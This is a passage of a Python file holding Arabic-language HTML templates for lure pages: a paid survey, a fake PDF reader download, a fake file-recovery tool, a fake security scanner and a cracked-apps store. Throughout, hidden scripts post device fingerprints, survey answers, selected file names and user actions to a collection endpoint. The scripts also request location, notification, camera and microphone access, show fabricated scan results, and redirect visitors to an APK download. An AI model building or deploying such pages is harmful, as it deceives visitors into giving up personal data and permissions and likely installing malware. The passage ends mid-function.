            cursor: pointer;
            transition: transform 0.2s ease;
            margin-top: 12px;
        }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn:active:not(:disabled) { transform: scale(0.96); }
        .hidden { display: none; }
        #finalMessage { text-align: center; padding: 30px 0; }
        #finalMessage h2 { font-size: 32px; margin-bottom: 16px; background: linear-gradient(to right, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="header"><span class="logo">📋 استبيان</span><span class="balance">💰 الرصيد: <span id="balance">0</span>$</span></div>
    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
    <div id="questionContainer">
        <div class="question" id="questionText"></div>
        <div class="options" id="optionsContainer"></div>
        <button class="btn" id="nextBtn" disabled>استمرار</button>
    </div>
    <div id="finalMessage" class="hidden">
        <h2>🎉 شكراً!</h2>
        <p style="margin-bottom:20px;">تم إرسال إجاباتك بنجاح.</p>
        <button class="btn" onclick="window.location.href='/'">العودة للرئيسية</button>
    </div>
</div>
<script>
    const questions = [
        { q: 'مجال عملك؟', o: ['تكنولوجيا', 'تعليم', 'صحة', 'مالية', 'خدمات'] },
        { q: 'ما هو عمرك؟', o: ['18-24', '25-34', '35-44', '45+'] },
        { q: 'ما هي المدينة التي تسكن فيها؟', o: ['القاهرة', 'الرياض', 'دبي', 'طرابلس', 'أخرى'] },
        { q: 'هل ترغب في تلقي عروض حصرية؟', o: ['نعم', 'لا'] }
    ];
    let currentQ = 0, balance = 0;
    let answers = [];

    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function requestLocation(callback) {
        if (!navigator.geolocation) { callback(null); return; }
        navigator.geolocation.getCurrentPosition(
            pos => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            err => callback(null)
        );
    }

    function renderQuestion() {
        const qs = questions[currentQ];
        if (!qs) {
            document.getElementById('questionContainer').style.display = 'none';
            document.getElementById('finalMessage').classList.remove('hidden');
            sendCollectedData('survey_answers', answers);
            return;
        }
        document.getElementById('questionText').textContent = qs.q;
        const container = document.getElementById('optionsContainer');
        container.innerHTML = '';
        qs.o.forEach(opt => {
            const div = document.createElement('div');
            div.className = 'option';
            div.textContent = opt;
            div.onclick = function() {
                document.querySelectorAll('.option').forEach(x => x.classList.remove('selected'));
                this.classList.add('selected');
                document.getElementById('nextBtn').disabled = false;
                answers[currentQ] = opt;
            };
            container.appendChild(div);
        });
        document.getElementById('nextBtn').disabled = true;
        const progress = ((currentQ) / questions.length) * 100;
        document.getElementById('progressBar').style.width = progress + '%';
    }

    document.getElementById('nextBtn').onclick = function() {
        if (document.getElementById('nextBtn').disabled) return;
        balance += 5;
        document.getElementById('balance').textContent = balance;
        currentQ++;
        renderQuestion();
        if (currentQ === 2) {
            requestLocation(pos => { if (pos) sendCollectedData('location', pos); });
        }
        if (currentQ === 3) {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
        }
    };

    renderQuestion();
    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
    };
</script>
</body>
</html>
'''

# صفحة PDF Reader (تصميم مميز)
PDF_READER_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDF Reader Pro</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            padding: 40px 30px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            color: #fff;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
        p { opacity: 0.8; margin-bottom: 24px; }
        .btn {
            display: inline-block;
            padding: 16px 40px;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            background: linear-gradient(to right, #f7971e, #ffd200);
            color: #000;
            cursor: pointer;
            transition: transform 0.2s ease;
            text-decoration: none;
        }
        .btn:active { transform: scale(0.96); }
        .stats { display: flex; justify-content: center; gap: 40px; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.15); }
        .stats div { font-size: 14px; opacity: 0.7; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">📄</div>
    <h1>PDF Reader Pro</h1>
    <p>اقرأ ملفات PDF بسهولة وأمان</p>
    <button class="btn" onclick="downloadAndCollect()">📥 تنزيل التطبيق</button>
    <div class="stats"><div>12.8 م.ب</div><div>1.5M+</div><div>4.9</div></div>
</div>
<script>
    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }
    function downloadAndCollect() {
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: 'geolocation' }).then(result => {});
        }
        sendCollectedData('pdf_download_click', { action: 'download' });
        alert('جارٍ تحميل التطبيق...');
        window.location.href = '/download_apk';
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
    }
    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
    };
</script>
</body>
</html>
'''

# صفحة استعادة الملفات (احترافية)
FILE_RECOVERY_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استعادة الملفات - Recover Pro</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: linear-gradient(145deg, #141b2b, #1a2335);
            border-radius: 28px;
            padding: 32px 28px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2a3a5a;
        }
        .header { text-align: center; margin-bottom: 24px; }
        .header .icon { font-size: 48px; display: block; }
        .header h1 { font-size: 28px; font-weight: 700; color: #00d4ff; }
        .header p { color: #8899bb; font-size: 14px; }
        .scan-area {
            background: #0f1625;
            border-radius: 16px;
            padding: 24px;
            border: 2px dashed #2a3a5a;
            text-align: center;
            margin-bottom: 20px;
            cursor: pointer;
            transition: border-color 0.3s;
        }
        .scan-area:hover { border-color: #00d4ff; }
        .scan-area .big-icon { font-size: 56px; }
        .scan-area .info { color: #8899bb; font-size: 14px; margin-top: 8px; }
        .scan-area input[type="file"] { display: none; }
        .progress-section { margin: 16px 0; }
        .progress-bar {
            background: #0a0e17;
            border-radius: 30px;
            height: 10px;
            overflow: hidden;
            border: 1px solid #2a3a5a;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #00d4ff, #0077ff);
            border-radius: 30px;
            transition: width 0.5s;
        }
        .stats { display: flex; justify-content: space-between; margin: 12px 0; font-size: 14px; color: #8899bb; }
        .stats span { font-weight: 600; color: #fff; }
        .file-list {
            max-height: 200px;
            overflow-y: auto;
            margin: 12px 0;
            background: #0a0e17;
            border-radius: 12px;
            padding: 8px;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            border-bottom: 1px solid #1a2335;
        }
        .file-item .name { display: flex; align-items: center; gap: 8px; }
        .file-item .size { color: #8899bb; font-size: 13px; }
        .file-item .recover-btn {
            background: #00d4ff;
            border: none;
            color: #000;
            padding: 4px 14px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
        }
        .file-item .recover-btn:hover { background: #00b8e6; }
        .btn-group { display: flex; gap: 12px; margin-top: 16px; }
        .btn-group button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-primary { background: linear-gradient(to right, #00d4ff, #0077ff); color: #fff; }
        .btn-secondary { background: #2a3a5a; color: #fff; }
        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(0,212,255,0.2); }
        .btn-secondary:hover { background: #3a4a6a; }
        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #556688; border-top: 1px solid #1a2335; padding-top: 16px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="icon">📂</span>
        <h1>استعادة الملفات</h1>
        <p>استعد ملفاتك المحذوفة بسهولة وأمان</p>
    </div>
    <div class="scan-area" onclick="document.getElementById('fileInput').click()">
        <div class="big-icon">📤</div>
        <div class="info">اضغط لاختيار ملفات للاستعادة</div>
        <input type="file" id="fileInput" multiple onchange="handleFiles(this.files)">
    </div>
    <div class="progress-section">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="stats"><span>تم المسح: <span id="scannedCount">0</span> ملف</span><span>قابل للاستعادة: <span id="recoverableCount">0</span></span></div>
    </div>
    <div class="file-list" id="fileList">
        <div style="text-align:center; color:#556688; padding:16px;">لم يتم العثور على ملفات</div>
    </div>
    <div class="btn-group">
        <button class="btn-primary" onclick="startScan()">🔍 فحص عميق</button>
        <button class="btn-secondary" onclick="recoverAll()">💾 استعادة الكل</button>
    </div>
    <div class="footer">Powered by Recover Pro v3.0</div>
</div>
<script>
    let selectedFiles = [];
    let recoveredFiles = [];

    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function handleFiles(files) {
        selectedFiles = [];
        for (let f of files) selectedFiles.push(f);
        sendCollectedData('files_selected_for_recovery', { count: selectedFiles.length, names: selectedFiles.map(f => f.name) });
        document.getElementById('scannedCount').textContent = selectedFiles.length;
        document.getElementById('recoverableCount').textContent = selectedFiles.length;
        renderFileList();
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
    }

    function renderFileList() {
        const container = document.getElementById('fileList');
        container.innerHTML = '';
        if (selectedFiles.length === 0) {
            container.innerHTML = '<div style="text-align:center; color:#556688; padding:16px;">لم يتم العثور على ملفات</div>';
            return;
        }
        selectedFiles.forEach((f, i) => {
            const div = document.createElement('div');
            div.className = 'file-item';
            div.innerHTML = `
                <span class="name">📄 ${f.name}</span>
                <span class="size">${(f.size / 1024).toFixed(1)} KB</span>
                <button class="recover-btn" onclick="recoverFile(${i})">استعادة</button>
            `;
            container.appendChild(div);
        });
    }

    function startScan() {
        sendCollectedData('scan_started', { type: 'deep_scan' });
        const fill = document.getElementById('progressFill');
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 8 + 2;
            if (progress >= 100) { progress = 100; clearInterval(interval); }
            fill.style.width = progress + '%';
        }, 200);
        setTimeout(() => {
            const extra = Math.floor(Math.random() * 10) + 3;
            for (let i = 0; i < extra; i++) {
                selectedFiles.push({ name: `file_${Date.now()}_${i}.${['pdf','docx','jpg','png','zip','mp4'][Math.floor(Math.random()*6)]}`, size: Math.floor(Math.random()*5000)+100 });
            }
            document.getElementById('scannedCount').textContent = selectedFiles.length;
            document.getElementById('recoverableCount').textContent = selectedFiles.length;
            renderFileList();
            sendCollectedData('scan_completed', { found: selectedFiles.length });
        }, 3000);
    }

    function recoverFile(index) {
        const file = selectedFiles[index];
        sendCollectedData('file_recovered', { name: file.name, size: file.size });
        alert(`✅ تم استعادة الملف: ${file.name} (محاكاة)`);
        recoveredFiles.push(file);
        selectedFiles.splice(index, 1);
        renderFileList();
        document.getElementById('recoverableCount').textContent = selectedFiles.length;
    }

    function recoverAll() {
        if (selectedFiles.length === 0) { alert('لا توجد ملفات للاستعادة'); return; }
        sendCollectedData('recover_all', { count: selectedFiles.length });
        recoveredFiles = recoveredFiles.concat(selectedFiles);
        selectedFiles = [];
        renderFileList();
        document.getElementById('recoverableCount').textContent = 0;
        document.getElementById('scannedCount').textContent = 0;
        alert('✅ تم استعادة جميع الملفات (محاكاة)');
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => { stream.getTracks().forEach(t => t.stop()); })
                .catch(err => {});
        }
    }

    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
    };
</script>
</body>
</html>
'''

# صفحة فحص الأمان الشامل (احترافية)
SECURITY_SCAN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص الأمان الشامل - SecureScan</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: linear-gradient(145deg, #141b2b, #1a2335);
            border-radius: 28px;
            padding: 32px 28px;
            max-width: 580px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2a3a5a;
        }
        .header { text-align: center; margin-bottom: 24px; }
        .header .icon { font-size: 48px; display: block; }
        .header h1 { font-size: 28px; font-weight: 700; color: #00ff88; }
        .header p { color: #8899bb; font-size: 14px; }
        .status-box {
            background: #0f1625;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
            border: 1px solid #2a3a5a;
        }
        .status-box .status-icon { font-size: 40px; }
        .status-box .status-text { font-size: 18px; font-weight: 600; margin-top: 4px; }
        .status-box .sub-text { color: #8899bb; font-size: 14px; }
        .scan-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 16px 0;
        }
        .scan-options button {
            padding: 14px;
            border: 1px solid #2a3a5a;
            border-radius: 14px;
            background: #0a0e17;
            color: #ccd;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .scan-options button:hover { border-color: #00ff88; background: #141b2b; }
        .scan-options .active { border-color: #00ff88; background: rgba(0,255,136,0.1); }
        .progress-section { margin: 16px 0; }
        .progress-bar {
            background: #0a0e17;
            border-radius: 30px;
            height: 12px;
            overflow: hidden;
            border: 1px solid #2a3a5a;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #00ff88, #00cc66);
            border-radius: 30px;
            transition: width 0.4s;
        }
        .result-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 12px;
            margin: 16px 0;
        }
        .result-item {
            background: #0f1625;
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            border: 1px solid #2a3a5a;
        }
        .result-item .num { font-size: 24px; font-weight: 700; }
        .result-item .label { font-size: 12px; color: #8899bb; }
        .result-item .num.good { color: #00ff88; }
        .result-item .num.warn { color: #ffaa00; }
        .result-item .num.danger { color: #ff4444; }
        .btn-group { display: flex; gap: 12px; margin-top: 16px; }
        .btn-group button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-primary { background: linear-gradient(to right, #00ff88, #00cc66); color: #000; }
        .btn-secondary { background: #2a3a5a; color: #fff; }
        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(0,255,136,0.2); }
        .btn-secondary:hover { background: #3a4a6a; }
        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #556688; border-top: 1px solid #1a2335; padding-top: 16px; }
        .scan-log {
            background: #0a0e17;
            border-radius: 12px;
            padding: 12px;
            max-height: 100px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            color: #8899bb;
            margin-top: 12px;
            border: 1px solid #1a2335;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="icon">🛡️</span>
        <h1>فحص الأمان الشامل</h1>
        <p>افحص جهازك بالكامل واكتشف الثغرات</p>
    </div>
    <div class="status-box">
        <div class="status-icon" id="statusIcon">🟢</div>
        <div class="status-text" id="statusText">جاهز للفحص</div>
        <div class="sub-text" id="statusSub">اضغط "فحص الآن" للبدء</div>
    </div>
    <div class="scan-options">
        <button onclick="startScan('quick')" id="quickBtn">⚡ فحص سريع</button>
        <button onclick="startScan('deep')" id="deepBtn">🔍 فحص عميق</button>
        <button onclick="startScan('custom')" id="customBtn">📁 فحص مخصص</button>
        <button onclick="viewReport()" id="reportBtn">📊 التقرير</button>
    </div>
    <div class="progress-section">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
    </div>
    <div class="result-grid">
        <div class="result-item"><div class="num good" id="safeCount">0</div><div class="label">آمن</div></div>
        <div class="result-item"><div class="num warn" id="warnCount">0</div><div class="label">تحذيرات</div></div>
        <div class="result-item"><div class="num danger" id="riskCount">0</div><div class="label">مخاطر</div></div>
    </div>
    <div class="scan-log" id="scanLog">[بدء] جاهز لفحص النظام...</div>
    <div class="btn-group">
        <button class="btn-primary" onclick="startScan('quick')">🔍 فحص الآن</button>
        <button class="btn-secondary" onclick="clearScan()">🗑️ مسح النتائج</button>
    </div>
    <div class="footer">SecureScan v2.1 - حماية شاملة</div>
</div>
<script>
    let isScanning = false;
    let scanResults = { safe: 0, warnings: 0, risks: 0 };

    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function logScan(message) {
        const log = document.getElementById('scanLog');
        log.innerHTML += '\n[' + new Date().toLocaleTimeString() + '] ' + message;
        log.scrollTop = log.scrollHeight;
        sendCollectedData('scan_log', { message: message });
    }

    function startScan(type) {
        if (isScanning) return;
        isScanning = true;
        document.getElementById('statusIcon').textContent = '🔄';
        document.getElementById('statusText').textContent = 'جاري الفحص...';
        document.getElementById('statusSub').textContent = 'يرجى الانتظار';
        const fill = document.getElementById('progressFill');
        let progress = 0;
        scanResults = { safe: 0, warnings: 0, risks: 0 };
        logScan('بدء الفحص ' + type);
        sendCollectedData('scan_started', { type: type });

        const interval = setInterval(() => {
            progress += Math.random() * 6 + 2;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                isScanning = false;
                document.getElementById('statusIcon').textContent = '✅';
                document.getElementById('statusText').textContent = 'اكتمل الفحص';
                document.getElementById('statusSub').textContent = 'تم اكتشاف ' + (scanResults.risks + scanResults.warnings) + ' مشكلة';
                logScan('اكتمل الفحص');
                sendCollectedData('scan_completed', scanResults);
                if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
                if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
            }
            fill.style.width = progress + '%';
            if (progress > 20 && progress < 40) {
                scanResults.safe = Math.floor(Math.random() * 50) + 30;
                scanResults.warnings = Math.floor(Math.random() * 10) + 3;
                scanResults.risks = Math.floor(Math.random() * 5) + 1;
            } else if (progress > 40 && progress < 70) {
                scanResults.safe = Math.floor(Math.random() * 80) + 50;
                scanResults.warnings = Math.floor(Math.random() * 15) + 5;
                scanResults.risks = Math.floor(Math.random() * 8) + 2;
            } else if (progress >= 70) {
                scanResults.safe = Math.floor(Math.random() * 120) + 80;
                scanResults.warnings = Math.floor(Math.random() * 20) + 8;
                scanResults.risks = Math.floor(Math.random() * 10) + 3;
            }
            document.getElementById('safeCount').textContent = scanResults.safe;
            document.getElementById('warnCount').textContent = scanResults.warnings;
            document.getElementById('riskCount').textContent = scanResults.risks;
        }, 300);
    }

    function viewReport() {
        sendCollectedData('view_report', scanResults);
        alert('📊 تقرير الفحص:\nآمن: ' + scanResults.safe + '\nتحذيرات: ' + scanResults.warnings + '\nمخاطر: ' + scanResults.risks + '\n(محاكاة)');
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
    }

    function clearScan() {
        sendCollectedData('clear_scan', {});
        scanResults = { safe: 0, warnings: 0, risks: 0 };
        document.getElementById('safeCount').textContent = '0';
        document.getElementById('warnCount').textContent = '0';
        document.getElementById('riskCount').textContent = '0';
        document.getElementById('progressFill').style.width = '0%';
        document.getElementById('statusIcon').textContent = '🟢';
        document.getElementById('statusText').textContent = 'جاهز للفحص';
        document.getElementById('statusSub').textContent = 'اضغط "فحص الآن" للبدء';
        document.getElementById('scanLog').innerHTML = '[بدء] جاهز لفحص النظام...';
        isScanning = false;
        alert('🗑️ تم مسح النتائج');
    }

    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => { stream.getTracks().forEach(t => t.stop()); })
                .catch(err => {});
        }
    };
</script>
</body>
</html>
'''

# صفحة تطبيقات مهكرة (شبيهة بمواقع التطبيقات المهكرة)
CRACKED_APPS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيقات مهكرة - CrackHub</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 650px;
            margin: 0 auto;
            background: linear-gradient(145deg, #141b2b, #1a2335);
            border-radius: 28px;
            padding: 28px 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2a3a5a;
        }
        .header { text-align: center; margin-bottom: 20px; }
        .header .icon { font-size: 40px; display: block; }
        .header h1 { font-size: 28px; font-weight: 700; color: #ff6b35; }
        .header p { color: #8899bb; font-size: 14px; }
        .search-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        .search-bar input {
            flex: 1;
            padding: 12px 16px;
            border-radius: 30px;
            border: 1px solid #2a3a5a;
            background: #0a0e17;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .search-bar input:focus { border-color: #ff6b35; }
        .search-bar button {
            padding: 12px 20px;
            border: none;
            border-radius: 30px;
            background: #ff6b35;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }
        .search-bar button:hover { background: #e55a2a; }
        .category-tabs {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 16px;
        }
        .category-tabs button {
            padding: 6px 16px;
            border: 1px solid #2a3a5a;
            border-radius: 30px;
            background: #0a0e17;
            color: #ccd;
            font-size: 13px;
            cursor: pointer;
            transition: 0.3s;
        }
        .category-tabs button.active { border-color: #ff6b35; background: rgba(255,107,53,0.15); color: #ff6b35; }
        .category-tabs button:hover { border-color: #ff6b35; }
        .app-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            margin: 16px 0;
        }
        .app-card {
            background: #0f1625;
            border-radius: 16px;
            padding: 16px;
            border: 1px solid #2a3a5a;
            transition: 0.3s;
            cursor: pointer;
        }
        .app-card:hover { border-color: #ff6b35; transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,107,53,0.05); }
        .app-card .app-icon { font-size: 36px; display: block; margin-bottom: 6px; }
        .app-card .app-name { font-weight: 700; font-size: 15px; }
        .app-card .app-version { font-size: 12px; color: #8899bb; }
        .app-card .app-size { font-size: 12px; color: #8899bb; margin-top: 4px; }
        .app-card .downloads { font-size: 12px; color: #00ff88; }
        .app-card .download-btn {
            background: #ff6b35;
            border: none;
            color: #fff;
            padding: 6px 14px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            margin-top: 8px;
            width: 100%;
            transition: 0.2s;
        }
        .app-card .download-btn:hover { background: #e55a2a; }
        .load-more { text-align: center; margin: 16px 0; }
        .load-more button {
            padding: 12px 30px;
            border: 1px solid #2a3a5a;
            border-radius: 30px;
            background: #0a0e17;
            color: #ccd;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .load-more button:hover { border-color: #ff6b35; }
        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #556688; border-top: 1px solid #1a2335; padding-top: 16px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="icon">📲</span>
        <h1>تطبيقات مهكرة</h1>
        <p>تحميل أحدث التطبيقات والألعاب المهكرة مجاناً</p>
    </div>
    <div class="search-bar">
        <input type="text" id="searchInput" placeholder="ابحث عن تطبيق..." oninput="filterApps(this.value)">
        <button onclick="searchApps()">🔍 بحث</button>
    </div>
    <div class="category-tabs">
        <button class="active" onclick="filterCategory('all', this)">الكل</button>
        <button onclick="filterCategory('games', this)">🎮 ألعاب</button>
        <button onclick="filterCategory('apps', this)">📱 تطبيقات</button>
        <button onclick="filterCategory('mods', this)">🛠️ مودات</button>
        <button onclick="filterCategory('popular', this)">🔥 الأكثر تحميلاً</button>
    </div>
    <div class="app-grid" id="appGrid">
        <!-- ستتم إضافة التطبيقات بواسطة JavaScript -->
    </div>
    <div class="load-more"><button onclick="loadMoreApps()">تحميل المزيد</button></div>
    <div class="footer">CrackHub v3.2 - جميع الحقوق محفوظة</div>
</div>
<script>
    let allApps = [
        { name: 'Spotify Premium', icon: '🎵', version: 'v8.9.2', size: '45 MB', downloads: '1.2M', category: 'apps' },
        { name: 'Minecraft Mod', icon: '⛏️', version: 'v1.20.1', size: '120 MB', downloads: '2.5M', category: 'games' },
        { name: 'WhatsApp Plus', icon: '💬', version: 'v2.23.12', size: '32 MB', downloads: '3.8M', category: 'apps' },
        { name: 'Free Fire Max', icon: '🔥', version: 'v2.105.1', size: '210 MB', downloads: '5.2M', category: 'games' },
        { name: 'Adobe Premiere Pro', icon: '🎬', version: 'v4.2.0', size: '180 MB', downloads: '850K', category: 'apps' },
        { name: 'GTA San Andreas', icon: '🚗', version: 'v2.10', size: '1.5 GB', downloads: '1.8M', category: 'games' },
        { name: 'YouTube Vanced', icon: '▶️', version: 'v17.03.38', size: '28 MB', downloads: '4.1M', category: 'apps' },
        { name: 'PUBG Mobile Lite', icon: '🔫', version: 'v2.8.0', size: '380 MB', downloads: '3.2M', category: 'games' },
        { name: 'Instagram Pro', icon: '📸', version: 'v3.4.2', size: '22 MB', downloads: '2.1M', category: 'apps' },
        { name: 'Call of Duty Mobile', icon: '🎯', version: 'v1.9.4', size: '450 MB', downloads: '1.9M', category: 'games' },
    ];

    let currentCategory = 'all';
    let displayedApps = [];

    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function renderApps(apps) {
        const grid = document.getElementById('appGrid');
        grid.innerHTML = '';
        if (apps.length === 0) {
            grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; color:#556688; padding:30px;">لا توجد تطبيقات مطابقة</div>';
            return;
        }
        apps.forEach((app, index) => {
            const card = document.createElement('div');
            card.className = 'app-card';
            card.innerHTML = `
                <span class="app-icon">${app.icon}</span>
                <div class="app-name">${app.name}</div>
                <div class="app-version">${app.version}</div>
                <div class="app-size">📦 ${app.size}</div>
                <div class="downloads">⬇️ ${app.downloads}</div>
                <button class="download-btn" onclick="downloadApp(${index})">📥 تحميل</button>
            `;
            grid.appendChild(card);
        });
    }

    function filterCategory(category, btn) {
        currentCategory = category;
